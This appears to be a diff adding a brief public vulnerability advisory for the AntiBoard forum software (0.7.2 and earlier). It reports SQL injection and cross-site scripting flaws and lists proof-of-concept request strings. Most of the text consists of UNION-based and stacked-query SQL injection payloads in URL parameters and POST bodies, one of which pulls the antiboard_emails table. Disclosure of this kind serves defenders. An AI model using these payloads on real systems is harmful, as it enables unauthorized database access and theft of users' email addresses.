@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/10821/info
+
+Multiple vulnerabilities are reported to exist in the application due to insufficient sanitization of user-supplied data. The issues include various instances of SQL injection and a cross-site scripting vulnerability.
+
+AntiBoard versions 0.7.2 and prior are affected by these issues.
+
+/antiboard.php?thread_id=1%20UNION%20ALL%20select%20field%20from%20whatever--&mode=threaded&sort_order=
+
+/antiboard.php?range=all&mode=threaded&thread_id=1&reply=1&parent_id=1%20UNION%20ALL%20select%20field%20from%20whatever--
+
+/antiboard.php?range=all&thread_id=1%20UNION%20ALL%20select%20field%20from%20whatever--&sort_order=ASC&mode=threaded
+
+/antiboard.php?thread_id=1&parent_id=1%20UNION%20ALL%20select%20field%20from%20whatever--&mode=nested&reply=1
+
+poster_name=1111&poster_email=1111&message_title=1111&message_body=1111&submit=Submit%2bmessage&thread_id=3&mode=1';%20exec%20whatever--&range=&parent_id=0&reply=reply
+
+POST antiboard.php poster_name=1111&poster_email=1111&message_title=1111&message_body=1111&submit=Submit%2bmessage&thread_id=3&mode=threaded&range=&parent_id=1%20UNION
+ALL select field from antiboard_emails----&reply=reply
